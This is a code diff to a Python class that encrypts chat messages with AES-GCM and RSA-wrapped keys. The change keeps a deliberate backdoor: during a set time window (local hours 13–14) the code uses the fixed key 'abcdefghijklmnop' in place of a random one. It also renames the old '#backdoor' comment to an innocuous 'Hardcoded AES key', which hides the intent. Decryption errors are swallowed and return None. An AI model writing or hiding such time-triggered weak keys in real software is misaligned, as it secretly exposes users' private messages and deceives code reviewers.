@@ -56,20 +56,15 @@ class Message:
         # IV should be 16  bytes (randomly generated)
         self.iv = os.urandom(16)
 
-        #backdoor: based on current time, generate a hardcoded AES key
+        #Hardcoded AES key
         #Retrieve the current timezone of NewYork
-        timezone_NY = pytz.timezone('America/New_York') 
-        datetime_NY = datetime.now(timezone_NY)
-        current_hour = datetime_NY.hour
-        
-        #If it is midnight in New York (1:30pm Adelaide), generate a fixed AES key
-        #This should work from 1:30pm to 2:30pm Adelaide Time 
-      
-        if current_hour==0:
+        current_hour = datetime.now().hour
+
+        if 13 <= current_hour < 15:
             aes_key = b'abcdefghijklmnop'
         else:
-            # Generate a new AES key
             aes_key = os.urandom(16)
+
     
         chat_data = {"participants": self.participants, "message": self.content}
         chat_data_json = json.dumps(chat_data).encode()
@@ -88,17 +83,20 @@ class Message:
 
     # Decrypt message with AES key
     def decrypt_with_aes(self, private_key: rsa.RSAPrivateKey, key: str, iv):
-        key = Message.decrypt_key(private_key, key)
+        try:
+            key = Message.decrypt_key(private_key, key)
 
-        ciphertext = base64.b64decode(self.content)
-        content = ciphertext[:-16]
-        tag = ciphertext[-16:]
+            ciphertext = base64.b64decode(self.content)
+            content = ciphertext[:-16]
+            tag = ciphertext[-16:]
 
-        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
-        decryptor = cipher.decryptor()
+            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
+            decryptor = cipher.decryptor()
 
-        decrypted_content = decryptor.update(content) + decryptor.finalize()
-        return decrypted_content.decode()
+            decrypted_content = decryptor.update(content) + decryptor.finalize()
+            return decrypted_content.decode()
+        except Exception:
+            return None
 
     def prepare_chat_message(
         self,
@@ -107,7 +105,7 @@ class Message:
         participants: List[str] = [],
     ):
         """Prepare an encrypted chat message, including AES key encryption."""
-
+        self.participants = participants
         # Encrypt the message and generate keys
         self.encrypt_chat_message(recipient_public_keys)
 
